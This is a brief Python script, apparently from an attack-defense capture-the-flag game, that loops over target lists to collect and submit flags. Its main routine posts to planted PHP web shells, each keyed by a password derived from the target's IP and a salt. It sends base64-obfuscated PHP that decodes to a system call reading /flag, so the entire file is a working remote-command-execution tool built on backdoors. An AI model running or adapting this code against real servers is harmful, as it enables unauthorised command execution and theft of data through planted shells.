from util import submit_flag,FLAG_FORMAT,salt
from undead import md5
import requests as req
import re
from urllib.parse import urlparse
import warnings
warnings.filterwarnings('ignore')


links =open('links.txt','r').read().split('\n')[:-1]
undeads=open('undead.txt','r').read().split('\n')[:-1]

def use_link(link_url):
	try:
		r=req.get(link_url,timeout=3)
		if re.match(FLAG_FORMAT,r.text):
			submit_flag(r.text)
	except Exception as e:
		pass


def use_undead(undead_url):
	ip=urlparse(undead_url).netloc
	shell_pwd=md5(md5(ip+salt))
	try:
		r=req.post(url=undead_url,data={shell_pwd:'''$aaa=base64_decode('c3lzdGVt');$bbb=base64_decode('Y2F0IC9mbGFn');$aaa($bbb);'''},timeout=3)
		if re.match(FLAG_FORMAT,r.text):
			submit_flag(r.text,ip)
	except Exception as e:
		print(e)
		pass



if __name__ == '__main__':
	for url in links:
		use_link(url)

	for url in undeads:
		use_undead(url)

